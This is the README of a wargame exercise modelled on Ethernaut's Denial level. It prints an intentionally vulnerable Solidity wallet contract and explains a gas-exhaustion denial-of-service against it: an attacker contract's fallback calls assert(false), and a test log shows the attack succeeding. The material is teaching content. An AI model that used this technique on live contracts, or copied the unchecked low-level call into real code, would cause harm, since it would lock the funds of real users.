# Solidity Game - Denial

_Inspired by OpenZeppelin's [Ethernaut](https://ethernaut.openzeppelin.com), Denial Level_

⚠️Do not try on mainnet!

## Task

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds) you will win this game.

## What will you learn?

1. `call` vs `transfer`
2. `assert` vs `require`

### `transfer` vs `call`

The `transfer` function fails if the balance of the current contract is not large enough or if the Ether transfer is rejected by the receiving account. The `transfer` function reverts on failure.

You should avoid using `.call()` whenever possible when executing another contract function as it bypasses type checking, function existence check, and argument packing.
`call` is low-level functions and should be used with care. Specifically, any unknown contract might be malicious and if you call it, you hand over control to that contract which could in turn call back into your contract, so be prepared for changes to your state variables when the call returns.

### `assert` vs `require`

with `assert`, you would lose the entire amount (or close to it). `assert` is effectively the catastrophic bail out of the transaction due to something completely unexpected. It should be used to check for things like making sure your contract hasn't wound up in an invalid state, avoid divide by 0, over/underflow, etc.

`require`, on the other hand, will only consume the gas used up to the point of failure. The remaining gas will be refunded.

Basically, `assert` is just there to prevent anything really bad from happening, but it shouldn't be possible for the condition to evaluate to false.

## What is the most difficult challenge?

### `assert` now uses `REVERT` opcode

That means, `assert` doesn't consume the entire available gas any more, since Solidity v0.8.0 😜

Before v0.8.0, `assert` complied to an `INVALID` (`0xFE`) opcode which drains out the gas. But now, `assert` and `require` are converted to the same opcode `0xFD` which is `REVERT`

Let's make a experiment. You are going to send some ether to the contract, of course it will fail, but we are going to test gas used by `assert` in different versions.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hacker {
  fallback() external payable {
    assert(false);
  }
}

```

- v0.6.12
  ![image](https://user-images.githubusercontent.com/78368735/124986696-e8344800-e009-11eb-8447-bc247b69c79d.png)

- v0.8.6 🙌
  ![image](https://user-images.githubusercontent.com/78368735/124986625-d5217800-e009-11eb-8b91-88cfe002b6ae.png)

### Deny

To win this game we have to prevent the owner from withdrawing funds. Before funds get transferred to owner there is `partner.call.value(amountToSend)();`, which we can exploit. Since no gas amount has been specified, all gas will be sent to the `fallback` function of the partner address.

We can write a contract with a `fallback` function that will trigger `assert` and thus spend all gas, making it so that the owner can't withdraw.

**Re-entrancy attack doesn't work for the game**

The goal is to make the `withdraw` call fail. We control the `partner` contract. The contract writer’s idea was that even if we revert in our contract using `revert` / `require` only our function call would fail but the withdrawal to the original owner would still continue. While this is true, notice that our function is being called using `.call` without specifying an explicit gas limit. We can just consume all available gas in the transaction resulting in the caller function to be out of gas and fail. Contrary to `revert` and `require`, the `assert` instruction consumes all gas.

_**NOTE:** You can't consume the entire gas with `assert` since Solidity v0.8.0_ 💩

## Source Code

⚠️This contract contains a bug or risk. Do not use on mainnet!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Denial {
  address public partner; // withdrawal partner - pay the gas, split the withdraw
  address payable public constant owner = payable(address(0xA9E));
  uint256 timeLastWithdrawn;
  mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

  function setWithdrawPartner(address _partner) public {
    partner = _partner;
  }

  // withdraw 1% to recipient and 1% to owner
  function withdraw() public {
    uint256 amountToSend = address(this).balance / 100;
    // perform a call without checking return
    // The recipient can revert, the owner will still get their share
    partner.call.value(amountToSend)("");
    owner.transfer(amountToSend);
    // keep track of last withdrawal time
    timeLastWithdrawn = now;
    withdrawPartnerBalances[partner] += amountToSend;
  }

  // allow deposit of funds
  fallback() external payable {}

  // convenience function
  function contractBalance() public view returns (uint256) {
    return address(this).balance;
  }
}

```

## Configuration

### Install Truffle cli

_Skip if you have already installed._

```
npm install -g truffle
```

### Install Dependencies

```
yarn install
```

## Test and Attack!💥

### Run Tests

```
truffle develop
test
```

```
truffle(develop)> test
Using network 'develop'.


Compiling your contracts...
===========================
> Everything is up to date, there is nothing to compile.



  Contract: Hacker
    √ should deny owner to withdraw (639ms)


  1 passing (689ms)

```
